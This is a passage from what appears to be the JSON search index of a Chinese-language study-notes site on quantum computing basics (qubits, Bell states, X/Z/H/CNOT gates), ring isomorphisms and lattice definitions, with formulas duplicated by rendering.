\u6703\u6709 4 \u500b computational basis state: |00\\rangle, |01\\rangle, |10\\rangle, |11\\rangle |00\\rangle, |01\\rangle, |10\\rangle, |11\\rangle \u6240\u4ee5 2 qubits \u7684\u72c0\u614b\u53ef\u4ee5\u662f |\\psi\\rangle = \\alpha_{00} |00\\rangle + \\alpha_{01} |01\\rangle + \\alpha_{10} |10\\rangle + \\alpha_{11} |11\\rangle |\\psi\\rangle = \\alpha_{00} |00\\rangle + \\alpha_{01} |01\\rangle + \\alpha_{10} |10\\rangle + \\alpha_{11} |11\\rangle \u89c0\u6e2c\u7b2c\u4e00\u500b qubit \u7684\u6642\u5019\uff0c\u6709 |\\alpha_{00}|^2 + |\\alpha_{01}|^2 |\\alpha_{00}|^2 + |\\alpha_{01}|^2 \u7684\u6a5f\u7387\u89c0\u6e2c\u5230 0 \u89c0\u6e2c\u51fa 0 \u4e4b\u5f8c\uff0c\u8a72\u4f4d\u5143\u7684\u72c0\u614b\u6703\u53ea\u5269\u4e0b\u7b2c\u4e00\u500b qubit \u6709 0 \u7684\u9805\uff0c\u4e26\u4e14\u8981\u6eff\u8db3 normalization condition\uff0c\u6240\u4ee5\u6703\u8b8a\u6210 \\frac{\\alpha_{00} |00\\rangle + \\alpha_{01} |01\\rangle}{\\sqrt{|\\alpha_{00}|^2 + |\\alpha_{01}|^2}} \\frac{\\alpha_{00} |00\\rangle + \\alpha_{01} |01\\rangle}{\\sqrt{|\\alpha_{00}|^2 + |\\alpha_{01}|^2}} \u63a5\u4e0b\u4f86\u6211\u5011\u4f86\u770b\u4e00\u500b\u91cd\u8981\u7684 two qubit \u72c0\u614b\uff0c\u53eb\u505a Bell state \u6216 EPR pair \\frac{|00\\rangle + |11\\rangle}{\\sqrt{2}} \\frac{|00\\rangle + |11\\rangle}{\\sqrt{2}} \u7b2c\u4e00\u500b qubit \u6709 \\frac{1}{2} \\frac{1}{2} \u7684\u6a5f\u7387\u89c0\u6e2c\u5230 0\uff0c\u6709 \\frac{1}{2} \\frac{1}{2} \u7684\u6a5f\u7387\u89c0\u6e2c\u5230 1\uff0c\u7b2c\u4e8c\u500b qubit \u4e5f\u662f\u4e00\u6a23\u7684\u60c5\u6cc1","title":"\u5169\u500b\u91cf\u5b50\u4f4d\u5143 ( 2 qubits )"},{"location":"algorithm/quantum-algorithm/quantum-bits/#_3","text":"\u540c\u7406\uff0cn \u500b\u91cf\u5b50\u4f4d\u5143\u5c31\u6703\u9577\u5f97\u50cf |\\psi\\rangle = \\sum_{x=\\{0, 1\\}^n} \\alpha_{x} |x\\rangle |\\psi\\rangle = \\sum_{x=\\{0, 1\\}^n} \\alpha_{x} |x\\rangle \uff0c \\{0, 1\\}^n \\{0, 1\\}^n \u4ee3\u8868\u7531 0 \u6216 1 \u7d44\u6210\u9577\u5ea6\u70ba n \u7684\u5b57\u4e32","title":"\u591a\u500b\u91cf\u5b50\u4f4d\u5143"},{"location":"algorithm/quantum-algorithm/quantum-gates/","text":"Single qubit gates \u5728\u50b3\u7d71\u8a08\u7b97\u6a5f\u4e2d\uff0c\u4e00\u500b\u4f4d\u5143\u7684\u908f\u8f2f\u9598\u53ea\u6709 NOT NOT \u662f\u628a 0 \u8b8a 1\uff0c1 \u8b8a 0\uff0c\u8868\u793a\u6210 Truth table \u5c31\u6703\u662f INPUT OUTPUT 0 1 1 0 \u5728\u91cf\u5b50\u8a08\u7b97\u6a5f\u4e2d\uff0c\u6709\u6c92\u6709\u985e\u4f3c\u65bc NOT \u7684\u908f\u8f2f\u9598\u5462? \u6211\u5011\u60f3\u8981\u7684\u662f |0\\rangle |0\\rangle \u8b8a\u6210 |1\\rangle |1\\rangle \uff0c |1\\rangle |1\\rangle \u8b8a\u6210 |0\\rangle |0\\rangle \uff0c\u4e00\u500b\u5f88\u81ea\u7136\u7684 NOT \u908f\u8f2f\u9598\u5c31\u662f\u628a \\alpha |0\\rangle + \\beta |1\\rangle \\alpha |0\\rangle + \\beta |1\\rangle \u8b8a\u6210 \\alpha |1\\rangle + \\beta |0\\rangle \\alpha |1\\rangle + \\beta |0\\rangle \u53ef\u4ee5\u628a\u9019\u500b NOT gate \u5beb\u6210\u4e00\u500b\u77e9\u9663 X = \\begin{bmatrix} 0 & 1\\\\ 1 & 0 \\end{bmatrix} X = \\begin{bmatrix} 0 & 1\\\\ 1 & 0 \\end{bmatrix} \u4e00\u500b\u91cf\u5b50\u4f4d\u5143\u5c31\u53ef\u4ee5\u8868\u793a\u6210\u4e00\u500b\u5411\u91cf \\begin{bmatrix} \\alpha \\\\ \\beta \\end{bmatrix} \\begin{bmatrix} \\alpha \\\\ \\beta \\end{bmatrix} \u5c0d\u4e00\u500b\u91cf\u5b50\u4f4d\u5143\u505a\u4e00\u500b NOT \u908f\u8f2f\u904b\u7b97\u5c31\u8b8a\u6210 X \\begin{bmatrix} \\alpha \\\\ \\beta \\end{bmatrix} = \\begin{bmatrix} \\beta \\\\ \\alpha \\end{bmatrix} X \\begin{bmatrix} \\alpha \\\\ \\beta \\end{bmatrix} = \\begin{bmatrix} \\beta \\\\ \\alpha \\end{bmatrix} \u4ee5\u4e0b\u6211\u5011\u5c31\u7a31 NOT gate \u70ba X gate \u6240\u4ee5\u4f5c\u7528\u5728\u4e00\u500b\u91cf\u5b50\u4f4d\u5143\u7684\u908f\u8f2f\u9598\u53ef\u4ee5\u88ab\u8868\u793a\u6210\u4e00\u500b 2 x 2 \u7684\u77e9\u9663 \u9084\u8a18\u5f97 \\alpha, \\beta \\alpha, \\beta \u90fd\u8981\u6eff\u8db3 normalization condition \u55ce\uff0c\u901a\u904e\u91cf\u5b50\u908f\u8f2f\u9598\u5f8c\u7684\u91cf\u5b50\u4f4d\u5143\u4e5f\u8981\u6eff\u8db3 normalization condition \u6839\u64da\u4e00\u4e9b\u6578\u5b78\u63a8\u5c0e\uff0c\u6211\u5011\u767c\u73fe\u53ea\u8981\u4ee3\u8868\u9019\u500b\u908f\u8f2f\u9598\u7684\u77e9\u9663\u662f\u4e00\u500b Unitary Matrix\uff0c\u5c31\u80fd\u6eff\u8db3 normalization condition \u800c Unitary Matrix \u7684\u5b9a\u7fa9\u662f \\text{U is Unitary Matrix} \\Leftrightarrow U^{\\dagger}U = I \\text{U is Unitary Matrix} \\Leftrightarrow U^{\\dagger}U = I \u9664\u4e86 X gate\uff0c\u9084\u6709\u53e6\u5916\u5169\u500b\u91cd\u8981\u7684\u908f\u8f2f\u9598\uff0cZ gate \u548c H gate ( Hadamard gate ) Z = \\begin{bmatrix} 1 & 0 \\\\ 0 & -1 \\end{bmatrix} Z = \\begin{bmatrix} 1 & 0 \\\\ 0 & -1 \\end{bmatrix} H = \\frac{1}{\\sqrt{2}} \\begin{bmatrix} 1 & 1 \\\\ 1 & -1 \\end{bmatrix} H = \\frac{1}{\\sqrt{2}} \\begin{bmatrix} 1 & 1 \\\\ 1 & -1 \\end{bmatrix} Two qubit gates \u5728\u50b3\u7d71\u8a08\u7b97\u6a5f\u4e2d\uff0c\u6211\u5011\u6709 AND, OR, XOR \u5404\u7a2e\u908f\u8f2f\u9598\uff0c\u80fd\u63a5\u53d7\u5169\u500b bits \u4f5c\u70ba\u8f38\u5165 \u5728\u91cf\u5b50\u8a08\u7b97\u6a5f\u4e2d\uff0c\u4e00\u500b\u80fd\u63a5\u6536\u5169\u500b qubits \u7684\u908f\u8f2f\u9598\u7684\u4f8b\u5b50\u662f CNOT gate CNOT gate \u63a5\u5169\u500b qubit \u505a\u8f38\u5165\uff0c\u7b2c\u4e00\u500b qubit \u53eb\u505a control qubit\uff0c\u7b2c\u4e8c\u500b qubit \u53eb\u505a target qubit \u7576 control qubit \u662f 0\uff0ctarget qubit \u4e0d\u6703\u8b8a \u7576 control qubit \u662f 1\uff0ctarget qubit \u6703\u88ab\u7ffb\u8f49 CNOT gate \u7684\u884c\u70ba\u53ef\u4ee5\u9019\u6a23\u8868\u793a |A,B\\rangle \\rightarrow |A,B \\oplus A\\rangle |A,B\\rangle \\rightarrow |A,B \\oplus A\\rangle \u4e0b\u9762\u5217\u51fa 4 \u500b computational basis state \u7d93\u904e CNOT gate \u7684\u8b8a\u5316 INPUT OUTPUT \\mid 00 \\rangle \\mid 00 \\rangle \\mid 00 \\rangle \\mid 00 \\rangle \\mid 01 \\rangle \\mid 01 \\rangle \\mid 01 \\rangle \\mid 01 \\rangle \\mid 10 \\rangle \\mid 10 \\rangle \\mid 11 \\rangle \\mid 11 \\rangle \\mid 11 \\rangle \\mid 11 \\rangle \\mid 10 \\rangle \\mid 10 \\rangle \u8868\u793a\u6210\u4e00\u500b 2 x 2 \u7684\u77e9\u9663\u5c31\u6703\u662f \\begin{bmatrix} 1 & 0 & 0 & 0 \\\\ 0 & 1 & 0 & 0 \\\\ 0 & 0 & 0 & 1 \\\\ 0 & 0 & 1 & 0 \\end{bmatrix} \\begin{bmatrix} 1 & 0 & 0 & 0 \\\\ 0 & 1 & 0 & 0 \\\\ 0 & 0 & 0 & 1 \\\\ 0 & 0 & 1 & 0 \\end{bmatrix} CNOT gate \u5f88\u50cf\u662f\u91cf\u5b50\u7248\u672c\u7684 XOR gate\uff0c\u90a3\u6211\u5011\u9084\u505a\u5f97\u51fa\u91cf\u5b50\u7248\u672c\u7684 AND, OR gate \u55ce? \u7b54\u6848\u662f\u4e0d\u884c\u7684\uff0c\u56e0\u70ba\u91cf\u5b50\u7684\u908f\u8f2f\u9598\u5fc5\u9808\u662f reversible\uff0c\u4ed6\u8981\u662f\u4e00\u500b Unitary Matrix\uff0c\u800c Unitary Matrix \u662f Invertible Matrix \u9019\u908a\u6211\u5011\u53ea\u4ecb\u7d39 CNOT gate\uff0c\u7576\u7136\u9084\u6709\u5f88\u591a\u5176\u4ed6\u7684\u908f\u8f2f\u9598\uff0c\u4e0d\u904e\u5176\u4ed6\u6709\u8da3\u7684\u908f\u8f2f\u9598\u57fa\u672c\u4e0a\u90fd\u662f\u7528\u6211\u5011\u525b\u525b\u4ecb\u7d39\u7684\u9019\u4e9b\u908f\u8f2f\u9598\u7d44\u5408\u51fa\u4f86\u7684","title":"\u5165\u9580\u91cf\u5b50\u96fb\u8166[2]: Quantum Gates"},{"location":"algorithm/quantum-algorithm/quantum-gates/#single-qubit-gates","text":"\u5728\u50b3\u7d71\u8a08\u7b97\u6a5f\u4e2d\uff0c\u4e00\u500b\u4f4d\u5143\u7684\u908f\u8f2f\u9598\u53ea\u6709 NOT NOT \u662f\u628a 0 \u8b8a 1\uff0c1 \u8b8a 0\uff0c\u8868\u793a\u6210 Truth table \u5c31\u6703\u662f INPUT OUTPUT 0 1 1 0 \u5728\u91cf\u5b50\u8a08\u7b97\u6a5f\u4e2d\uff0c\u6709\u6c92\u6709\u985e\u4f3c\u65bc NOT \u7684\u908f\u8f2f\u9598\u5462? \u6211\u5011\u60f3\u8981\u7684\u662f |0\\rangle |0\\rangle \u8b8a\u6210 |1\\rangle |1\\rangle \uff0c |1\\rangle |1\\rangle \u8b8a\u6210 |0\\rangle |0\\rangle \uff0c\u4e00\u500b\u5f88\u81ea\u7136\u7684 NOT \u908f\u8f2f\u9598\u5c31\u662f\u628a \\alpha |0\\rangle + \\beta |1\\rangle \\alpha |0\\rangle + \\beta |1\\rangle \u8b8a\u6210 \\alpha |1\\rangle + \\beta |0\\rangle \\alpha |1\\rangle + \\beta |0\\rangle \u53ef\u4ee5\u628a\u9019\u500b NOT gate \u5beb\u6210\u4e00\u500b\u77e9\u9663 X = \\begin{bmatrix} 0 & 1\\\\ 1 & 0 \\end{bmatrix} X = \\begin{bmatrix} 0 & 1\\\\ 1 & 0 \\end{bmatrix} \u4e00\u500b\u91cf\u5b50\u4f4d\u5143\u5c31\u53ef\u4ee5\u8868\u793a\u6210\u4e00\u500b\u5411\u91cf \\begin{bmatrix} \\alpha \\\\ \\beta \\end{bmatrix} \\begin{bmatrix} \\alpha \\\\ \\beta \\end{bmatrix} \u5c0d\u4e00\u500b\u91cf\u5b50\u4f4d\u5143\u505a\u4e00\u500b NOT \u908f\u8f2f\u904b\u7b97\u5c31\u8b8a\u6210 X \\begin{bmatrix} \\alpha \\\\ \\beta \\end{bmatrix} = \\begin{bmatrix} \\beta \\\\ \\alpha \\end{bmatrix} X \\begin{bmatrix} \\alpha \\\\ \\beta \\end{bmatrix} = \\begin{bmatrix} \\beta \\\\ \\alpha \\end{bmatrix} \u4ee5\u4e0b\u6211\u5011\u5c31\u7a31 NOT gate \u70ba X gate \u6240\u4ee5\u4f5c\u7528\u5728\u4e00\u500b\u91cf\u5b50\u4f4d\u5143\u7684\u908f\u8f2f\u9598\u53ef\u4ee5\u88ab\u8868\u793a\u6210\u4e00\u500b 2 x 2 \u7684\u77e9\u9663 \u9084\u8a18\u5f97 \\alpha, \\beta \\alpha, \\beta \u90fd\u8981\u6eff\u8db3 normalization condition \u55ce\uff0c\u901a\u904e\u91cf\u5b50\u908f\u8f2f\u9598\u5f8c\u7684\u91cf\u5b50\u4f4d\u5143\u4e5f\u8981\u6eff\u8db3 normalization condition \u6839\u64da\u4e00\u4e9b\u6578\u5b78\u63a8\u5c0e\uff0c\u6211\u5011\u767c\u73fe\u53ea\u8981\u4ee3\u8868\u9019\u500b\u908f\u8f2f\u9598\u7684\u77e9\u9663\u662f\u4e00\u500b Unitary Matrix\uff0c\u5c31\u80fd\u6eff\u8db3 normalization condition \u800c Unitary Matrix \u7684\u5b9a\u7fa9\u662f \\text{U is Unitary Matrix} \\Leftrightarrow U^{\\dagger}U = I \\text{U is Unitary Matrix} \\Leftrightarrow U^{\\dagger}U = I \u9664\u4e86 X gate\uff0c\u9084\u6709\u53e6\u5916\u5169\u500b\u91cd\u8981\u7684\u908f\u8f2f\u9598\uff0cZ gate \u548c H gate ( Hadamard gate ) Z = \\begin{bmatrix} 1 & 0 \\\\ 0 & -1 \\end{bmatrix} Z = \\begin{bmatrix} 1 & 0 \\\\ 0 & -1 \\end{bmatrix} H = \\frac{1}{\\sqrt{2}} \\begin{bmatrix} 1 & 1 \\\\ 1 & -1 \\end{bmatrix} H = \\frac{1}{\\sqrt{2}} \\begin{bmatrix} 1 & 1 \\\\ 1 & -1 \\end{bmatrix}","title":"Single qubit gates"},{"location":"algorithm/quantum-algorithm/quantum-gates/#two-qubit-gates","text":"\u5728\u50b3\u7d71\u8a08\u7b97\u6a5f\u4e2d\uff0c\u6211\u5011\u6709 AND, OR, XOR \u5404\u7a2e\u908f\u8f2f\u9598\uff0c\u80fd\u63a5\u53d7\u5169\u500b bits \u4f5c\u70ba\u8f38\u5165 \u5728\u91cf\u5b50\u8a08\u7b97\u6a5f\u4e2d\uff0c\u4e00\u500b\u80fd\u63a5\u6536\u5169\u500b qubits \u7684\u908f\u8f2f\u9598\u7684\u4f8b\u5b50\u662f CNOT gate CNOT gate \u63a5\u5169\u500b qubit \u505a\u8f38\u5165\uff0c\u7b2c\u4e00\u500b qubit \u53eb\u505a control qubit\uff0c\u7b2c\u4e8c\u500b qubit \u53eb\u505a target qubit \u7576 control qubit \u662f 0\uff0ctarget qubit \u4e0d\u6703\u8b8a \u7576 control qubit \u662f 1\uff0ctarget qubit \u6703\u88ab\u7ffb\u8f49 CNOT gate \u7684\u884c\u70ba\u53ef\u4ee5\u9019\u6a23\u8868\u793a |A,B\\rangle \\rightarrow |A,B \\oplus A\\rangle |A,B\\rangle \\rightarrow |A,B \\oplus A\\rangle \u4e0b\u9762\u5217\u51fa 4 \u500b computational basis state \u7d93\u904e CNOT gate \u7684\u8b8a\u5316 INPUT OUTPUT \\mid 00 \\rangle \\mid 00 \\rangle \\mid 00 \\rangle \\mid 00 \\rangle \\mid 01 \\rangle \\mid 01 \\rangle \\mid 01 \\rangle \\mid 01 \\rangle \\mid 10 \\rangle \\mid 10 \\rangle \\mid 11 \\rangle \\mid 11 \\rangle \\mid 11 \\rangle \\mid 11 \\rangle \\mid 10 \\rangle \\mid 10 \\rangle \u8868\u793a\u6210\u4e00\u500b 2 x 2 \u7684\u77e9\u9663\u5c31\u6703\u662f \\begin{bmatrix} 1 & 0 & 0 & 0 \\\\ 0 & 1 & 0 & 0 \\\\ 0 & 0 & 0 & 1 \\\\ 0 & 0 & 1 & 0 \\end{bmatrix} \\begin{bmatrix} 1 & 0 & 0 & 0 \\\\ 0 & 1 & 0 & 0 \\\\ 0 & 0 & 0 & 1 \\\\ 0 & 0 & 1 & 0 \\end{bmatrix} CNOT gate \u5f88\u50cf\u662f\u91cf\u5b50\u7248\u672c\u7684 XOR gate\uff0c\u90a3\u6211\u5011\u9084\u505a\u5f97\u51fa\u91cf\u5b50\u7248\u672c\u7684 AND, OR gate \u55ce? \u7b54\u6848\u662f\u4e0d\u884c\u7684\uff0c\u56e0\u70ba\u91cf\u5b50\u7684\u908f\u8f2f\u9598\u5fc5\u9808\u662f reversible\uff0c\u4ed6\u8981\u662f\u4e00\u500b Unitary Matrix\uff0c\u800c Unitary Matrix \u662f Invertible Matrix \u9019\u908a\u6211\u5011\u53ea\u4ecb\u7d39 CNOT gate\uff0c\u7576\u7136\u9084\u6709\u5f88\u591a\u5176\u4ed6\u7684\u908f\u8f2f\u9598\uff0c\u4e0d\u904e\u5176\u4ed6\u6709\u8da3\u7684\u908f\u8f2f\u9598\u57fa\u672c\u4e0a\u90fd\u662f\u7528\u6211\u5011\u525b\u525b\u4ecb\u7d39\u7684\u9019\u4e9b\u908f\u8f2f\u9598\u7d44\u5408\u51fa\u4f86\u7684","title":"Two qubit gates"},{"location":"algorithm/quantum-algorithm/resources/","text":"\u76f8\u95dc\u8cc7\u6e90 Quantum Computation and Quantum Information An Introduction to Quantum Algorithms IBM Q","title":"\u76f8\u95dc\u8cc7\u6e90"},{"location":"algorithm/quantum-algorithm/resources/#_1","text":"Quantum Computation and Quantum Information An Introduction to Quantum Algorithms IBM Q","title":"\u76f8\u95dc\u8cc7\u6e90"},{"location":"math/math-term/","text":"\u6578\u5b78\u540d\u8a5e Smooth Number \u4e00\u500b smooth \u7684\u6b63\u6574\u6578\u7684\u8cea\u56e0\u6578\u90fd\u5f88\u5c0f \u4e00\u500b B-smooth \u7684\u6b63\u6574\u6578\u7684\u8cea\u56e0\u6578\u90fd\u4e0d\u5927\u65bc B Semiprime \u5169\u500b\u8cea\u6578\u7684\u4e58\u7a4d\u53eb\u505a semiprime","title":"\u6578\u5b78\u540d\u8a5e"},{"location":"math/math-term/#_1","text":"","title":"\u6578\u5b78\u540d\u8a5e"},{"location":"math/math-term/#smooth-number","text":"\u4e00\u500b smooth \u7684\u6b63\u6574\u6578\u7684\u8cea\u56e0\u6578\u90fd\u5f88\u5c0f \u4e00\u500b B-smooth \u7684\u6b63\u6574\u6578\u7684\u8cea\u56e0\u6578\u90fd\u4e0d\u5927\u65bc B","title":"Smooth Number"},{"location":"math/math-term/#semiprime","text":"\u5169\u500b\u8cea\u6578\u7684\u4e58\u7a4d\u53eb\u505a semiprime","title":"Semiprime"},{"location":"math/resources/","text":"\u76f8\u95dc\u8cc7\u6e90 mathonline : \u8d85\u68d2\u7684\u7dda\u4e0a\u8cc7\u6e90","title":"\u76f8\u95dc\u8cc7\u6e90"},{"location":"math/resources/#_1","text":"mathonline : \u8d85\u68d2\u7684\u7dda\u4e0a\u8cc7\u6e90","title":"\u76f8\u95dc\u8cc7\u6e90"},{"location":"math/algebra/000/","text":"First Ring Isomorphism Theorem Example Define \\rho : \\mathbb{R}[x] \\to \\mathbb{C} \\rho : \\mathbb{R}[x] \\to \\mathbb{C} such that \\rho(f(x)) = f(i) \\rho(f(x)) = f(i) for f(x) \\in \\mathbb{R}[x] f(x) \\in \\mathbb{R}[x] Lemma ker(\\rho) = (x^2 + 1) \\mathbb{R}[x] ker(\\rho) = (x^2 + 1) \\mathbb{R}[x] Proof \\begin{align} f(x) &= (x^2 + 1) \\mathbb{R}[x] + ax + b \\in ker(\\rho) \\\\ f(i) &= ai + b = 0 \\end{align} \\begin{align} f(x) &= (x^2 + 1) \\mathbb{R}[x] + ax + b \\in ker(\\rho) \\\\ f(i) &= ai + b = 0 \\end{align} if a \\ne 0 a \\ne 0 , i = \\frac{-b}{a} i = \\frac{-b}{a} ( contradiction ) if a = 0 a = 0 , b = 0 b = 0 , then f(x) = (x^2 + 1) \\mathbb{R}[x] f(x) = (x^2 + 1) \\mathbb{R}[x] By First Ring Isomorphism Theorem \\mathbb{R}[x] / (x^2 + 1) \\mathbb{R}[x] \\cong \\rho(\\mathbb{R}[x]) \\mathbb{R}[x] / (x^2 + 1) \\mathbb{R}[x] \\cong \\rho(\\mathbb{R}[x]) \\mathbb{R}[x] / (x^2 + 1) \\mathbb{R}[x] \\mathbb{R}[x] / (x^2 + 1) \\mathbb{R}[x] \u53ef\u4ee5\u770b\u6210 \\{ax + b | a, b \\in \\mathbb{R}\\} \\{ax + b | a, b \\in \\mathbb{R}\\} \u505a\u52a0\u6e1b\u4e58\u9664\u904b\u7b97\u6a21 (x^2 + 1) (x^2 + 1) \\rho(\\mathbb{R}[x]) = \\{ai + b | a, b \\in \\mathbb{R}\\} = \\mathbb{C} \\rho(\\mathbb{R}[x]) = \\{ai + b | a, b \\in \\mathbb{R}\\} = \\mathbb{C} \u7d50\u8ad6\u662f\u6211\u5011\u53ef\u4ee5\u628a\u8907\u6578\u4e0a\u9762\u7684\u904b\u7b97\u8f49\u63db\u6210\u5be6\u6578\u591a\u9805\u5f0f\u4e0a\u7684\u904b\u7b97","title":"First Ring Isomorphism Theorem"},{"location":"math/algebra/000/#first-ring-isomorphism-theorem","text":"","title":"First Ring Isomorphism Theorem"},{"location":"math/algebra/000/#example","text":"Define \\rho : \\mathbb{R}[x] \\to \\mathbb{C} \\rho : \\mathbb{R}[x] \\to \\mathbb{C} such that \\rho(f(x)) = f(i) \\rho(f(x)) = f(i) for f(x) \\in \\mathbb{R}[x] f(x) \\in \\mathbb{R}[x] Lemma ker(\\rho) = (x^2 + 1) \\mathbb{R}[x] ker(\\rho) = (x^2 + 1) \\mathbb{R}[x] Proof \\begin{align} f(x) &= (x^2 + 1) \\mathbb{R}[x] + ax + b \\in ker(\\rho) \\\\ f(i) &= ai + b = 0 \\end{align} \\begin{align} f(x) &= (x^2 + 1) \\mathbb{R}[x] + ax + b \\in ker(\\rho) \\\\ f(i) &= ai + b = 0 \\end{align} if a \\ne 0 a \\ne 0 , i = \\frac{-b}{a} i = \\frac{-b}{a} ( contradiction ) if a = 0 a = 0 , b = 0 b = 0 , then f(x) = (x^2 + 1) \\mathbb{R}[x] f(x) = (x^2 + 1) \\mathbb{R}[x] By First Ring Isomorphism Theorem \\mathbb{R}[x] / (x^2 + 1) \\mathbb{R}[x] \\cong \\rho(\\mathbb{R}[x]) \\mathbb{R}[x] / (x^2 + 1) \\mathbb{R}[x] \\cong \\rho(\\mathbb{R}[x]) \\mathbb{R}[x] / (x^2 + 1) \\mathbb{R}[x] \\mathbb{R}[x] / (x^2 + 1) \\mathbb{R}[x] \u53ef\u4ee5\u770b\u6210 \\{ax + b | a, b \\in \\mathbb{R}\\} \\{ax + b | a, b \\in \\mathbb{R}\\} \u505a\u52a0\u6e1b\u4e58\u9664\u904b\u7b97\u6a21 (x^2 + 1) (x^2 + 1) \\rho(\\mathbb{R}[x]) = \\{ai + b | a, b \\in \\mathbb{R}\\} = \\mathbb{C} \\rho(\\mathbb{R}[x]) = \\{ai + b | a, b \\in \\mathbb{R}\\} = \\mathbb{C} \u7d50\u8ad6\u662f\u6211\u5011\u53ef\u4ee5\u628a\u8907\u6578\u4e0a\u9762\u7684\u904b\u7b97\u8f49\u63db\u6210\u5be6\u6578\u591a\u9805\u5f0f\u4e0a\u7684\u904b\u7b97","title":"Example"},{"location":"math/lattice/definition/","text":"\u5b9a\u7fa9 Lattice Given n n linearly independent vectors \\mathbf{b_1}, \\mathbf{b_2}, \\cdots, \\mathbf{b_n} \\in \\mathbb{R^m} \\mathbf{b_1}, \\mathbf{b_2}, \\cdots, \\mathbf{b_n} \\in \\mathbb{R^m} , the lattice generated by them is defined as L(\\mathbf{b_1}, \\cdots, \\mathbf{b_n}) \\overset{\\text{def}}{=} \\Big{\\{}\\sum_{i=1}^{n}x_i\\mathbf{b_i} \\ | \\ x_i \\in \\mathbb{Z}\\Big{\\}} L(\\mathbf{b_1}, \\cdots, \\mathbf{b_n}) \\overset{\\text{def}}{=} \\Big{\\{}\\sum_{i=1}^{n}x_i\\mathbf{b_i} \\ | \\ x_i \\in \\mathbb{Z}\\Big{\\}} We can write \\mathbf{b_1}, \\cdots, \\mathbf{b_n} \\mathbf{b_1}, \\cdots, \\mathbf{b_n} as a matrix \\mathbf{B} \\mathbf{B} for convenience \\mathbf{B} = \\begin{pmatrix} | & & | \\\\ \\mathbf{b_1} & \\cdots & \\mathbf{b_n} \\\\ | & & | \\end{pmatrix} \\mathbf{B} = \\begin{pmatrix} | & & | \\\\ \\mathbf{b_1} & \\cdots & \\mathbf{b_n} \\\\ | & & | \\end{pmatrix} L(\\mathbf{B}) \\overset{\\text{def}}{=} \\{\\mathbf{Bx} \\ | \\ \\mathbf{x} \\in \\mathbb{Z}^n \\} L(\\mathbf{B}) \\overset{\\text{def}}{=} \\{\\mathbf{Bx} \\ | \\ \\mathbf{x} \\in \\mathbb{Z}^n \\} We call \\{\\mathbf{b_1}, \\cdots, \\mathbf{b_n}\\} \\{\\mathbf{b_1}, \\cdots, \\mathbf{b_n}\\} a basis of lattice We call n n the rank of lattice We call m m the dimension of lattice When n = m n = m , we call the lattice a full-rank lattice Lattice \u8ddf Vector Space \u5f88\u50cf\uff0c\u4f46 Lattice \u662f vectors \u6574\u6578\u500d \u7684 linear combination Unimodular Matrix A matrix \\mathbf{U} \\in \\mathbb{Z}^{n \\times n} \\mathbf{U} \\in \\mathbb{Z}^{n \\times n} is unimodular if |\\text{det}(\\mathbf{U})| = 1 |\\text{det}(\\mathbf{U})| = 1 \u6027\u8cea ( property ) \\mathbf{U} \\mathbf{U} is unimodular \\Leftrightarrow \\Leftrightarrow \\mathbf{U}^{-1} \\mathbf{U}^{-1} is unimodular Fundamental Parallelepiped Given n n linearly independent vectors \\mathbf{b_1}, \\mathbf{b_2}, \\cdots, \\mathbf{b_n} \\in \\mathbb{R^m} \\mathbf{b_1}, \\mathbf{b_2}, \\cdots, \\mathbf{b_n} \\in \\mathbb{R^m} , their fundamental parallelepiped is defined as P(\\mathbf{b_1}, \\cdots, \\mathbf{b_n}) \\overset{\\text{def}}{=} \\Big{\\{}\\sum_{i=1}^{n}x_i\\mathbf{b_i} \\ | \\ x_i \\in \\mathbb{R}, 0 \\le x_i < 1\\Big{\\}} P(\\mathbf{b_1}, \\cdots, \\mathbf{b_n}) \\overset{\\text{def}}{=} \\Big{\\{}\\sum_{i=1}^{n}x_i\\mathbf{b_i} \\ | \\ x_i \\in \\mathbb{R}, 0 \\le x_i < 1\\Big{\\}} Determinant of Lattice Let \\mathbf{B} \\mathbf{B} be the basis matrix of L L \\text{det}(L) = \\text{det}(\\mathbf{B}) = \\text{vol}(P(\\mathbf{B})) \\text{det}(L) = \\text{det}(\\mathbf{B}) = \\text{vol}(P(\\mathbf{B})) \\text{det}(L) \\text{det}(L) \u662f\u500b\u5b9a\u503c\uff0c\u6240\u6709\u7684 bases \u90fd\u6709\u4e00\u6a23\u7684 determinant Minimum Distance of Lattice \\lambda_1(L) = \\underset{v \\ \\in \\ L \\setminus 0}{min} \\|v\\| \\lambda_1(L) = \\underset{v \\ \\in \\ L \\setminus 0}{min} \\|v\\|","title":"\u5b9a\u7fa9"},{"location":"math/lattice/definition/#_1","text":"","title":"\u5b9a\u7fa9"},{"location":"math/lattice/definition/#lattice","text":"Given n n linearly independent vectors \\mathbf{b_1}, \\mathbf{b_2}, \\cdots, \\mathbf{b_n} \\in \\mathbb{R^m} \\mathbf{b_1}, \\mathbf{b_2}, \\cdots, \\mathbf{b_n} \\in \\mathbb{R^m} , the lattice generated by them is defined as L(\\mathbf{b_1}, \\cdots, \\mathbf{b_n}) \\overset{\\text{def}}{=} \\Big{\\{}\\sum_{i=1}^{n}x_i\\mathbf{b_i} \\ | \\ x_i \\in \\mathbb{Z}\\Big{\\}} L(\\mathbf{b_1}, \\cdots, \\mathbf{b_n}) \\overset{\\text{def}}{=} \\Big{\\{}\\sum_{i=1}^{n}x_i\\mathbf{b_i} \\ | \\ x_i \\in \\mathbb{Z}\\Big{\\}} We can write \\mathbf{b_1}, \\cdots, \\mathbf{b_n} \\mathbf{b_1}, \\cdots, \\mathbf{b_n} as a matrix \\mathbf{B} \\mathbf{B} for convenience \\mathbf{B} = \\begin{pmatrix} | & & | \\\\ \\mathbf{b_1} & \\cdots & \\mathbf{b_n} \\\\ | & & | \\end{pmatrix} \\mathbf{B} = \\begin{pmatrix} | & & | \\\\ \\mathbf{b_1} & \\cdots & \\mathbf{b_n} \\\\ | & & | \\end{pmatrix} L(\\mathbf{B}) \\overset{\\text{def}}{=} \\{\\mathbf{Bx} \\ | \\ \\mathbf{x} \\in \\mathbb{Z}^n \\} L(\\mathbf{B}) \\overset{\\text{def}}{=} \\{\\mathbf{Bx} \\ | \\ \\mathbf{x} \\in \\mathbb{Z}^n \\} We call \\{\\mathbf{b_1}, \\cdots, \\mathbf{b_n}\\} \\{\\mathbf{b_1}, \\cdots, \\mathbf{b_n}\\} a basis of lattice We call n n the rank of lattice We call m m the dimension of lattice When n = m n = m , we call the lattice a full-rank lattice Lattice \u8ddf Vector Space \u5f88\u50cf\uff0c\u4f46 Lattice \u662f vectors \u6574\u6578\u500d \u7684 linear combination","title":"Lattice"},{"location":"math/lattice/definition/#unimodular-matrix","text":"A matrix \\mathbf{U} \\in \\mathbb{Z}^{n \\times n} \\mathbf{U} \\in \\mathbb{Z}^{n \\times n} is unimodular if 